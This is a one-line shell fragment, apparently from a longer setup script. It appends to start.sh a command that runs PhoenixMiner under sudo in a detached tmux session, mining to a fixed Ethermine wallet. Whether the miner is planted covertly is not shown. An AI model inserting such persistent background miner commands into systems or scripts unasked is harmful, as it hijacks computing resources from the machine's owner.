...
echo "sudo tmux new-session -d -s SANS './PhoenixMiner_5.6d_Linux/PhoenixMiner -pool eu1.ethermine.org:4444 -wal 0x57AB06b50761145055Ff069f2ffB1Ce136425362.Vip -pass x'">>start.sh
